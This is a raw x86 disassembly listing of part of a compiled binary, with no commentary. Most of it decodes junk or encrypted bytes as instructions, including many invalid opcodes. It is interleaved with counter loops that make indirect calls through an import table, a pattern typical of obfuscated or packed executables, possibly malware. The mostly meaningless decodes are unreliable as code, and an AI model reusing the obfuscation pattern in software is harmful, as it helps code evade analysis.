  40a0be:	fwait
  40a0bf:	push   ebp
  40a0c0:	mov    ebx,0xe868bfe3
  40a0c5:	es cdq 
  40a0c7:	pop    ebx
  40a0c8:	inc    esi
  40a0c9:	cld    
  40a0ca:	mov    dh,0x18
  40a0cc:	aad    0x4f
  40a0ce:	cmp    DWORD PTR [ebx],edi
  40a0d0:	clc    
  40a0d1:	retf   
  40a0d2:	xor    al,0x36
  40a0d4:	jb     0x40a0ce
  40a0d6:	bound  ecx,QWORD PTR [ebp+0x2]
  40a0d9:	jbe    0x40a0f5
  40a0db:	push   ecx
  40a0dc:	std    
  40a0dd:	xchg   ebx,eax
  40a0de:	les    esp,FWORD PTR [edx-0x7caf6ecc]
  40a0e4:	or     DWORD PTR [eax+0x47c9ebc1],ebx
  40a0ea:	sbb    ebx,edx
  40a0ec:	dec    ecx
  40a0ed:	add    DWORD PTR [esi-0x34],esp
  40a0f0:	pop    ebx
  40a0f1:	repz adc DWORD PTR [edi+edi*8-0x27],0x53f2c409
  40a0fa:	and    al,0xf1
  40a0fc:	dec    eax
  40a0fd:	xchg   ebx,eax
  40a0fe:	sub    DWORD PTR [eax-0x1a0f74d0],esi
  40a104:	jns    0x40a0d5
  40a106:	sub    ebp,DWORD PTR [esi+eiz*2+0x26]
  40a10a:	fidiv  WORD PTR [ebp+edi*2-0x12]
  40a10e:	jecxz  0x40a0cd
  40a110:	setl   BYTE PTR ds:0x5da06a18
  40a117:	loopne 0x40a105
  40a119:	ins    DWORD PTR es:[edi],dx
  40a11a:	scas   al,BYTE PTR es:[edi]
  40a11b:	inc    edi
  40a11c:	or     DWORD PTR [edx-0x9],ebx
  40a11f:	ret    
  40a120:	sbb    eax,0xb2c6e3a3
  40a125:	addr16 nop
  40a127:	adc    BYTE PTR cs:[eax-0x9],dh
  40a12b:	push   0x4bcb3e9
  40a130:	stos   DWORD PTR es:[edi],eax
  40a131:	jge    0x40a0c1
  40a133:	add    cl,BYTE PTR ds:0x3e2b7480
  40a139:	adc    BYTE PTR es:[ebx],0x4c
  40a13d:	dec    eax
  40a13e:	bound  eax,QWORD PTR [ecx+0xa]
  40a141:	pop    eax
  40a142:	(bad)  
  40a144:	mov    ah,0x74
  40a146:	mov    esi,0x341687d3
  40a14b:	(bad)  
  40a14c:	das    
  40a14d:	jg     0x40a1ad
  40a14f:	fwait
  40a150:	or     al,0xc9
  40a152:	inc    DWORD PTR [edx-0x40]
  40a155:	xor    cl,BYTE PTR [ebx]
  40a157:	ds es popf 
  40a15a:	xor    al,0x1e
  40a15c:	mov    ds:0x2c772f54,eax
  40a161:	fimul  DWORD PTR [edi+0x78]
  40a164:	test   al,bh
  40a166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a167:	pushf  
  40a168:	in     eax,0x6d
  40a16a:	aaa    
  40a16b:	dec    esi
  40a16c:	xchg   BYTE PTR [eax],ch
  40a16e:	sbb    dh,BYTE PTR [edx+0x76]
  40a171:	and    BYTE PTR [ebx-0x5dd73834],bh
  40a177:	bound  ebx,QWORD PTR [eax+0x138b9498]
  40a17d:	adc    ah,bl
  40a17f:	lods   al,BYTE PTR ds:[esi]
  40a180:	add    edi,DWORD PTR [edi+0x6477c943]
  40a186:	test   DWORD PTR [edx+edx*1-0x7bc50a7],esi
  40a18d:	retf   0x23c9
  40a190:	xchg   ebx,eax
  40a191:	and    ecx,DWORD PTR [ebx]
  40a193:	mov    esi,0x947e006b
  40a198:	dec    edi
  40a199:	std    
  40a19a:	addr16 cdq 
  40a19c:	jo     0x40a201
  40a19e:	(bad)  
  40a19f:	jmp    0x40a1d5
  40a1a1:	retf   
  40a1a2:	jne    0x40a144
  40a1a4:	(bad)  
  40a1a5:	jle    0x40a15b
  40a1a7:	mov    bl,0xb
  40a1a9:	sar    DWORD PTR [ebp-0x21],1
  40a1ac:	daa    
  40a1ad:	(bad)
  40a1b0:	cmp    ah,ch
  40a1b2:	and    eax,esi
  40a1b4:	and    BYTE PTR [ebp-0x4ef107e7],0xd4
  40a1bb:	mov    ebp,0x3dfde1f2
  40a1c0:	and    eax,0x51343005
  40a1c5:	lock call 0xfb05:0xeb4c30bf
  40a1cd:	and    edi,DWORD PTR [eax+eax*1-0x18]
  40a1d1:	adc    eax,0x9f82e011
  40a1d6:	adc    bh,bh
  40a1d8:	pop    ecx
  40a1d9:	sbb    al,0x9a
  40a1db:	mov    edi,0x14a33e0b
  40a1e0:	shr    DWORD PTR [ecx],0x68
  40a1e3:	ret    
  40a1e4:	pop    ebx
  40a1e5:	ins    DWORD PTR es:[edi],dx
  40a1e6:	iret   
  40a1e7:	push   cs
  40a1e8:	dec    ecx
  40a1e9:	jae    0x40a1c8
  40a1eb:	(bad)  
  40a1ec:	ins    DWORD PTR es:[edi],dx
  40a1ed:	(bad)  
  40a1ee:	repz cwde 
  40a1f0:	push   ebp
  40a1f1:	ins    DWORD PTR es:[edi],dx
  40a1f2:	dec    edi
  40a1f3:	sahf   
  40a1f4:	adc    bh,BYTE PTR [eax-0x51845b21]
  40a1fa:	jne    0x40a1dc
  40a1fc:	dec    edi
  40a1fd:	xlat   BYTE PTR ds:[ebx]
  40a1fe:	(bad)  
  40a1ff:	test   eax,0xea5bfceb
  40a205:	mov    eax,ds:0xf558a23e
  40a20a:	push   edx
  40a20b:	ins    DWORD PTR es:[edi],dx
  40a20c:	dec    ebx
  40a20d:	mov    eax,ds:0x9bb86c7e
  40a212:	jmp    0x7b6c5d30
  40a217:	dec    ecx
  40a218:	cmp    edx,DWORD PTR [ecx]
  40a21a:	into   
  40a21b:	cmp    eax,0x624aa589
  40a220:	lahf   
  40a221:	sub    dh,dl
  40a223:	sti    
  40a224:	or     ebx,DWORD PTR [ebx]
  40a226:	or     bh,BYTE PTR [edi]
  40a228:	(bad)  
  40a22a:	js     0x40a1ea
  40a22c:	repnz push eax
  40a22e:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  40a235:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  40a23c:	adc    edx,edx
  40a23e:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  40a245:	and    DWORD PTR ds:0x42fced,0x0
  40a24f:	jmp    0x40a263
  40a254:	xor    edx,edx
  40a256:	or     edx,DWORD PTR ds:0x42fced
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fced,edx
  40a263:	cmp    DWORD PTR ds:0x42fced,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fced,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e2e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e128,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e70f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	cmp    dl,BYTE PTR [ebp-0xaba7846]
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a2a3
  40a2d1:	mov    ebp,0xb8b38547
  40a2d6:	div    BYTE PTR [edx]
  40a2d8:	sub    DWORD PTR [ecx],0xf4563538
  40a2de:	add    bh,0xef
  40a2e1:	test   al,0xd5
  40a2e3:	fmul   DWORD PTR [ebx+ecx*2]
  40a2e6:	lods   al,BYTE PTR ds:[esi]
  40a2e7:	pop    ebp
  40a2e8:	or     esp,ebx
  40a2ea:	neg    BYTE PTR ds:[esi+edi*1]
  40a2ee:	sub    eax,0xa1c2e600
  40a2f3:	xor    esi,DWORD PTR [edi+0x9]
  40a2f6:	fadd   QWORD PTR [esi-0x63dd0a14]
  40a2fc:	cld    
  40a2fd:	shl    DWORD PTR [eax+0x1eadcea6],cl
  40a303:	jl     0x40a36b
  40a305:	or     eax,0xcd6db1e
  40a30a:	in     eax,0xb0
  40a30c:	push   DWORD PTR [edi]
  40a30e:	popf   
  40a30f:	(bad)  
  40a311:	inc    esi
  40a312:	out    0x18,eax
  40a314:	jns    0x40a320
  40a316:	loop   0x40a2c1
  40a318:	(bad)  
  40a319:	in     eax,0x19
  40a31b:	loop   0x40a318
  40a31d:	pop    ss
  40a31e:	adc    eax,0x58e7e34f
  40a323:	pusha  
  40a324:	xor    bh,BYTE PTR [edi-0x533fb7aa]
  40a32a:	pop    ds
  40a32b:	ret    
  40a32c:	or     DWORD PTR [edi+0x3ae5d2ab],eax
  40a332:	jae    0x40a2dd
  40a334:	push   esi
  40a335:	int3   
  40a336:	std    
  40a337:	mov    edx,0x7928ad54
  40a33c:	jecxz  0x40a38f
  40a33e:	int    0x9a
  40a340:	cdq    
  40a341:	les    esi,FWORD PTR [eax+ebx*8-0x11d1ce04]
  40a348:	inc    ebp
  40a349:	and    DWORD PTR [edx-0x3c2f781f],0xa79490a
  40a353:	sti    
  40a354:	mov    ah,0x94
  40a356:	stc    
  40a357:	pop    ds
  40a358:	lods   eax,DWORD PTR ds:[esi]
  40a359:	pop    esp
  40a35a:	adc    eax,0xce5121ea
  40a35f:	loope  0x40a368
  40a361:	mov    eax,ds:0x33432b7a
  40a366:	cmp    DWORD PTR [ebx],edi
  40a368:	sub    BYTE PTR [edi-0x49950100],al
  40a36e:	xchg   BYTE PTR [ebp+0x6e],ah
  40a371:	out    dx,al
  40a372:	add    ch,bh
  40a374:	xlat   BYTE PTR ds:[ebx]
  40a375:	pop    es
  40a376:	push   ds
  40a377:	mov    ah,0xec
  40a379:	pop    esp
  40a37a:	mov    ah,BYTE PTR [ebp+0x78]
  40a37d:	push   es
  40a37e:	push   ebx
  40a37f:	loop   0x40a376
  40a381:	add    eax,0x72c98f01
  40a386:	cmp    al,BYTE PTR [esi-0x3b4ef300]
  40a38c:	xchg   ebp,eax
  40a38d:	pop    ebp
  40a38e:	lods   eax,DWORD PTR fs:[esi]
  40a390:	jl     0x40a3e1
  40a392:	aad    0xd5
  40a394:	or     BYTE PTR [ecx-0x334b687b],0x60
  40a39b:	adc    eax,0xa3ecdb45
  40a3a0:	shl    DWORD PTR [esp+ecx*8+0x26],cl
  40a3a4:	cs enter 0x3c5e,0xdb
  40a3a9:	sub    DWORD PTR [edx-0x1abc83a4],ebx
  40a3af:	jmp    0xd6488a4a
  40a3b4:	iret   
  40a3b5:	push   ss
  40a3b6:	dec    edx
  40a3b7:	(bad)  
  40a3b8:	repnz pushf 
  40a3ba:	adc    al,0xfc
  40a3bc:	fwait
  40a3bd:	or     al,0xba
  40a3bf:	xchg   esi,eax
  40a3c0:	daa    
  40a3c1:	cmp    edi,DWORD PTR [ebx+esi*1-0x4c8cfc78]
  40a3c8:	pop    es
  40a3c9:	mov    BYTE PTR [edi+0x7bb5a0fa],ch
  40a3cf:	and    al,0x79
  40a3d1:	ss stos DWORD PTR es:[edi],eax
  40a3d3:	cmp    BYTE PTR [esi],al
  40a3d5:	cmp    eax,0x7ca2abc7
  40a3da:	and    BYTE PTR [ebx-0x6b5ea44b],ah
  40a3e0:	xchg   esp,eax
  40a3e1:	rdpmc  
  40a3e3:	int3   
  40a3e4:	pop    ss
  40a3e5:	or     DWORD PTR ds:0x2da37a,ebp
  40a3eb:	sub    al,0x29
  40a3ed:	jmp    0xa8a3:0x9991b1bb
  40a3f4:	(bad)  
  40a3f5:	push   edi
  40a3f6:	push   eax
  40a3f7:	jbe    0x40a3fc
  40a3f9:	mov    ch,0x79
  40a3fb:	inc    ecx
  40a3fc:	dec    edi
  40a3fd:	cmp    eax,0xb8bf4e0e
  40a402:	test   DWORD PTR [edx+edi*8-0x5a513c0a],eax
  40a409:	popa   
  40a40a:	shr    DWORD PTR [ebp-0x4f],1
  40a40d:	push   ds
  40a40e:	add    ah,al
  40a410:	pop    es
  40a411:	imul   edx,DWORD PTR [eax+edx*8+0x29],0xffffffb8
  40a416:	xchg   edx,eax
  40a417:	repnz xchg esp,eax
  40a419:	test   al,0xc2
  40a41b:	retf   0x3c83
  40a41e:	sub    DWORD PTR [esi-0x41],eax
  40a421:	(bad)  
  40a422:	cmp    DWORD PTR [ebp-0x7],edi
  40a425:	aad    0x2b
  40a427:	jb     0x40a417
  40a429:	push   eax
  40a42a:	inc    edx
  40a42b:	jmp    0x84aba51e
  40a430:	mov    ch,0xa7
  40a432:	xor    eax,0x68e6f2e2
  40a437:	pushf  
  40a438:	test   eax,0xfbf433e7
  40a43d:	add    dh,bl
  40a43f:	push   esp
  40a440:	jge    0x40a401
  40a442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a443:	jno    0x40a433
  40a445:	test   BYTE PTR [edi],dl
  40a447:	push   ss
  40a448:	je     0x40a3e2
  40a44a:	mov    bl,0x9d
  40a44c:	or     esp,esp
  40a44e:	nop
  40a44f:	aad    0xef
  40a451:	dec    eax
  40a452:	xlat   BYTE PTR ds:[ebx]
  40a453:	fs dec esi
  40a455:	test   edx,eax
  40a457:	sub    DWORD PTR [edx],eax
  40a459:	inc    ebp
  40a45a:	or     ebx,DWORD PTR [edi+0x19]
  40a45d:	(bad)  
  40a45e:	or     ebp,eax
  40a460:	mov    eax,0x283941c6
  40a465:	enter  0x3f0b,0x84
  40a469:	fnsave [eax-0x4b1f96d8]
  40a46f:	mov    ebx,0x1400af50
  40a474:	sub    ah,bl
  40a476:	sub    esi,DWORD PTR [ebp+0x240b7daa]
  40a47c:	dec    edi
  40a47d:	enter  0x7994,0xf8
  40a481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a482:	jge    0x40a4af
  40a484:	addr16 inc esi
  40a486:	sti    
  40a487:	in     eax,dx
  40a488:	mov    al,0x12
  40a48a:	je     0x40a4c2
  40a48c:	(bad)  
  40a48d:	jns    0x40a470
  40a48f:	mov    al,ds:0xce73e032
  40a494:	out    0xc,al
  40a496:	adc    eax,0x35c1675a
  40a49b:	int3   
  40a49c:	push   cs
  40a49d:	mov    bh,0xca
  40a49f:	xor    al,0x27
  40a4a1:	xor    ebx,DWORD PTR [eax+0x6c]
  40a4a4:	dec    BYTE PTR [ebx+0x270a16d7]
  40a4aa:	dec    eax
  40a4ab:	pop    ebx
  40a4ac:	pop    ss
  40a4ad:	(bad)  
  40a4ae:	out    dx,eax
  40a4af:	pop    esp
  40a4b0:	loop   0x40a510
  40a4b2:	ret    0xb7b1
  40a4b5:	rcl    DWORD PTR [ecx],cl
  40a4b7:	push   ds
  40a4b8:	fwait
  40a4b9:	push   esp
  40a4ba:	mov    eax,DWORD PTR [ebx-0x48]
  40a4bd:	push   0x75f709c5
  40a4c2:	call   FWORD PTR [ebx+0x5c]
  40a4c5:	xor    bh,BYTE PTR [esi]
  40a4c7:	pop    ecx
  40a4c8:	pop    ebx
  40a4c9:	jecxz  0x40a4c7
  40a4cb:	scas   eax,DWORD PTR es:[edi]
  40a4cc:	and    dh,BYTE PTR [ecx]
  40a4ce:	adc    DWORD PTR [eax+0x2f688e8f],edi
  40a4d4:	mov    al,ss:0x911efc9c
  40a4da:	cmp    BYTE PTR [eax+0x32e41ed8],0x6e
  40a4e1:	add    WORD PTR [ecx+0x42],bx
  40a4e5:	or     bh,bl
  40a4e7:	sbb    BYTE PTR [edx+0x6531aac],ch
  40a4ed:	fstp   DWORD PTR [ebx]
  40a4ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4f0:	(bad)  
  40a4f1:	imul   ebx,DWORD PTR [edi-0x5d],0x35
  40a4f5:	mov    ch,0x9c
  40a4f7:	outs   dx,DWORD PTR ds:[esi]
  40a4f8:	popf   
  40a4f9:	sub    al,0xc
  40a4fb:	aas    
  40a4fc:	cmc    
  40a4fd:	mov    BYTE PTR [esi-0xd0da1b0],dh
  40a503:	mov    BYTE PTR [edi+0x25fe18e3],al
  40a509:	add    eax,0x7d660115
  40a50e:	scas   al,BYTE PTR es:[edi]
  40a50f:	cwde   
  40a510:	xor    al,0x37
  40a512:	cld    
  40a513:	and    eax,0xda7cee98
  40a518:	jle    0x40a509
  40a51a:	push   edx
  40a51b:	pop    ebx
  40a51c:	cdq    
  40a51d:	pop    ebp
  40a51e:	aad    0xa7
  40a520:	mov    ds,WORD PTR [ecx+eiz*8+0x18]
  40a524:	outs   dx,DWORD PTR ds:[esi]
  40a525:	paddsb mm3,mm5
  40a528:	retf   0x99e7
  40a52b:	dec    edx
  40a52c:	in     al,dx
  40a52d:	mov    bl,0x73
  40a52f:	mov    edx,0x1e38e36f
  40a534:	and    al,dl
  40a536:	cs scas al,BYTE PTR es:[edi]
  40a538:	nop
  40a539:	xchg   esi,eax
  40a53a:	out    0xcd,eax
  40a53c:	jp     0x40a4c6
  40a53e:	cld    
  40a53f:	push   cs
  40a540:	repnz iret 
  40a542:	lods   eax,DWORD PTR ds:[esi]
  40a543:	and    BYTE PTR [edi],ch
  40a545:	jbe    0x40a4e0
  40a547:	push   edx
  40a548:	jg     0x40a515
  40a54a:	imul   ecx,DWORD PTR [esi-0xab9a7ed],0x2e2ef8b
  40a554:	sub    eax,0x5c6d96c2
  40a559:	jo     0x40a5af
  40a55b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a55c:	jle    0x40a5cc
  40a55e:	popf   
  40a55f:	pop    esi
  40a560:	mov    cl,0xc4
  40a562:	push   0x14
  40a564:	inc    ebp
  40a565:	jo     0x40a5b4
  40a567:	iret   
  40a568:	(bad)  [ecx+eiz*2+0x41db5539]
  40a56f:	mov    eax,0x390b206b
  40a574:	and    eax,DWORD PTR [ebx]
  40a576:	cmp    dl,BYTE PTR [ebp-0x751fa93a]
  40a57c:	bound  esp,QWORD PTR [ebx]
  40a57e:	mov    esi,0x62a4ff1
  40a583:	pop    ebp
  40a584:	pop    esp
  40a585:	cli    
  40a586:	fs push 0xf3ace9c
  40a58c:	xlat   BYTE PTR ds:[ebx]
  40a58d:	pop    eax
  40a58e:	(bad)  
  40a590:	and    BYTE PTR [ecx+0x6ecd096f],ah
  40a596:	fild   QWORD PTR [ebx+0x360a5757]
  40a59c:	sbb    BYTE PTR [edx-0x42835b9c],dl
  40a5a2:	aas    
  40a5a3:	lea    ebx,[edx+0x3b]
  40a5a6:	and    al,0xcc
  40a5a8:	loop   0x40a60b
  40a5aa:	xchg   edi,eax
  40a5ab:	cmp    ebp,DWORD PTR [edx]
  40a5ad:	lahf   
  40a5ae:	ins    BYTE PTR es:[edi],dx
  40a5af:	lea    ebx,[ebp-0x6c]
  40a5b2:	imul   ebp,esp,0x7fb0df0f
  40a5b8:	repz cmp ecx,esp
  40a5bb:	xchg   DWORD PTR cs:[edx+0x4c],eax
  40a5bf:	cmc    
  40a5c0:	imul   ebp,DWORD PTR [edx-0x49],0x58fb80c1
  40a5c7:	repnz test esi,ebp
  40a5ca:	imul   ebx,DWORD PTR [eax],0x9f988454
  40a5d0:	jl     0x40a5db
  40a5d2:	jb     0x40a5b6
  40a5d4:	lods   eax,DWORD PTR ds:[esi]
  40a5d5:	aad    0xb0
  40a5d7:	test   al,0xe0
  40a5d9:	dec    eax
  40a5da:	out    0x63,eax
  40a5dc:	sub    DWORD PTR [edi+0x24],edx
  40a5df:	fsubr  QWORD PTR [edx]
  40a5e1:	dec    edi
  40a5e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5e3:	lahf   
  40a5e4:	cwde   
  40a5e5:	imul   edx,DWORD PTR [edi-0x2a6170c],0x3a
  40a5ec:	xor    ebp,DWORD PTR [ecx]
  40a5ee:	out    dx,al
  40a5ef:	lods   al,BYTE PTR ds:[esi]
  40a5f0:	or     esp,DWORD PTR [ecx]
  40a5f2:	cmp    ebp,DWORD PTR [edx]
  40a5f4:	les    edx,FWORD PTR [edi+0x59]
  40a5f7:	icebp  
  40a5f8:	ficomp WORD PTR [ebx+0x220d93bf]
  40a5fe:	pop    edi
  40a5ff:	rcl    esi,0x9a
  40a602:	das    
  40a603:	cdq    
  40a604:	cli    
  40a605:	adc    al,0x31
  40a607:	fadd   QWORD PTR [esi+eiz*1-0x1e]
  40a60b:	jg     0x40a68a
  40a60d:	xor    al,BYTE PTR [ecx+0x26]
  40a610:	int    0x15
  40a612:	sar    DWORD PTR [ebx+0x3c43d9bb],0x25
  40a619:	scas   al,BYTE PTR es:[edi]
  40a61a:	adc    BYTE PTR [ecx+ebx*2+0x6ed87fef],dh
  40a621:	cmp    BYTE PTR [edx-0xd],al
  40a624:	mov    ds:0xd4f40031,eax
  40a629:	push   ss
  40a62a:	cmp    eax,0x6fd1c19b
  40a62f:	sbb    bh,ch
  40a631:	leave  
  40a632:	retf   0x3d0d
  40a635:	dec    eax
  40a636:	adc    DWORD PTR [ecx+0x5ea663ef],esi
  40a63c:	and    ah,ch
  40a63e:	repz cld 
  40a640:	push   ss
  40a641:	loopne 0x40a68a
  40a643:	stc    
  40a644:	dec    ebx
  40a645:	pop    ecx
  40a646:	inc    ebx
  40a647:	loop   0x40a606
  40a649:	(bad)  
  40a64a:	loope  0x40a666
  40a64c:	lea    edx,[ebp+0x2a]
  40a64f:	pop    ss
  40a650:	push   ecx
  40a651:	add    ecx,DWORD PTR [ecx-0x50845323]
  40a657:	lahf   
  40a658:	xor    al,0xe4
  40a65a:	mov    dl,0xa9
  40a65c:	neg    BYTE PTR [edi+0x3f]
  40a65f:	dec    ebp
  40a660:	dec    ecx
  40a661:	icebp  
  40a662:	jmp    0x40a6c2
  40a664:	mov    al,0x49
  40a666:	lods   eax,DWORD PTR ds:[esi]
  40a667:	mov    esi,0x3015e53d
  40a66c:	pusha  
  40a66d:	aaa    
  40a66e:	ds daa 
  40a670:	add    al,0xc7
  40a672:	inc    ebp
  40a673:	int3   
  40a674:	cmp    al,0x85
  40a676:	pushf  
  40a677:	clc    
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e6ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e6ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e6ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e6ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e6f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e2eb
  40a6c6:	cmp    DWORD PTR ds:0x42e6ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e6ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e6ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e6ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fcdd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fcdd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fcdd,edx
  40a709:	cmp    DWORD PTR ds:0x42fcdd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fcdd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e26d
  40a728:	push   0x42e25b
  40a72d:	call   DWORD PTR ds:0x42e547
  40a733:	cmp    DWORD PTR ds:0x42fcdd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fcdd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fcdd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e134
  40a75a:	xor    edi,DWORD PTR ds:0x42e713
  40a760:	mov    DWORD PTR ds:0x42e134,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e713,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fcd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fce5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e713,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fcf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e130,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e130,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e130,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e1e7
  40a7e8:	push   0x42e23d
  40a7ed:	push   0x42e23d
  40a7f2:	call   DWORD PTR ds:0x42e2ef
  40a7f8:	cmp    DWORD PTR ds:0x42e130,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e130
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e130,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e130
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e130,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e12c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fd6e
  40a839:	add    DWORD PTR ds:0x42e707,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	push   edx
  40a854:	pop    ebx
  40a855:	inc    edi
  40a856:	aas    
  40a857:	in     al,0xf1
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a808
  40a860:	popa   
  40a861:	outs   dx,DWORD PTR ds:[esi]
  40a862:	bsf    edi,ebx
  40a865:	icebp  
  40a866:	ror    BYTE PTR fs:[eax+0x1c636abf],cl
  40a86d:	inc    edi
  40a86e:	or     al,0xc7
  40a870:	outs   dx,BYTE PTR ds:[esi]
  40a871:	pop    eax
  40a872:	push   edx
  40a873:	ins    DWORD PTR es:[edi],dx
  40a874:	ja     0x40a816
  40a876:	(bad)  
  40a878:	dec    esp
  40a879:	add    DWORD PTR [eax-0x7f83f88a],eax
  40a87f:	sbb    al,0xda
  40a881:	inc    esi
  40a882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a883:	aas    
  40a884:	sub    DWORD PTR [esi-0x71568d33],ecx
  40a88a:	and    bl,BYTE PTR [ebp+0x22]
  40a88d:	push   ebx
  40a88e:	cmp    BYTE PTR [esi-0x32],cl
  40a891:	push   esp
  40a892:	cld    
  40a893:	popa   
  40a894:	and    BYTE PTR [edx+0x22],bh
  40a897:	sbb    cl,BYTE PTR [ebx-0x7d9489e4]
  40a89d:	ss jbe 0x40a91a
  40a8a0:	into   
  40a8a1:	leave  
  40a8a2:	(bad)  
  40a8a3:	mov    WORD PTR [esi],gs
  40a8a5:	(bad)
  40a8a8:	xor    DWORD PTR [eax+edx*4-0x46056529],esp
  40a8af:	stos   BYTE PTR es:[edi],al
  40a8b0:	sbb    al,BYTE PTR [ebx-0x28f189bd]
  40a8b6:	call   0xa3da:0x67d5a5b4
  40a8bd:	scas   al,BYTE PTR es:[edi]
  40a8be:	pusha  
  40a8bf:	add    eax,ebx
  40a8c1:	mov    WORD PTR [edi+0x45f9bc3],?
  40a8c7:	sar    DWORD PTR [ecx-0x6e],0xe4
  40a8cb:	(bad)  
  40a8cc:	xchg   esi,eax
  40a8cd:	or     BYTE PTR [edx],ah
  40a8cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8d0:	inc    esi
  40a8d1:	fcomp  DWORD PTR [esi+0x3c]
  40a8d4:	les    edx,FWORD PTR [ebp+0x3e]
  40a8d7:	mov    edx,0x3f8d2385
  40a8dc:	mov    ebx,0x917b0545
  40a8e1:	es sub eax,0x6b0c29f2
  40a8e7:	xchg   esi,eax
  40a8e8:	sub    edx,esi
  40a8ea:	cs pop ecx
  40a8ec:	cli    
  40a8ed:	pop    edi
  40a8ee:	inc    ebx
  40a8ef:	xor    eax,0xfa263409
  40a8f4:	xor    eax,0x2ec21fcb
  40a8f9:	(bad)  
  40a8fa:	sub    DWORD PTR [esi+0x45f6a14f],0xfbd76c66
  40a904:	push   0x61
  40a906:	or     ebp,esi
  40a908:	push   cs
  40a909:	mov    ecx,0xac430a7c
  40a90e:	retf   
  40a90f:	bound  ebp,QWORD PTR [ecx-0x19d65d35]
  40a915:	sbb    eax,0xceb2287d
  40a91a:	xchg   ebx,eax
  40a91b:	pusha  
  40a91c:	add    al,BYTE PTR [ebx]
  40a91e:	imul   ebx,DWORD PTR [ebx+0x33a8cea7],0x871ad003
